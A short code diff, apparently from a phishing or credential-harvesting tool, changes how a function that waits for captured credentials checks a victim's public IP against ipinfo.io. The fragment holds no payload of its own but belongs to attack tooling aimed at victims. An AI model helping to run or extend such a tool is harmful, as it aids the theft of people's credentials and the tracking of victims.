@@ -153,7 +153,7 @@ def waitCreds():
             ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
             resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
             ipinfo = json.loads(resp)
-            if (ipinfo['bogon'] != None):
+            if 'bogon' in ipinfo:
                   print ('======================================================================'.format(RED, END))
                   print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
             else:
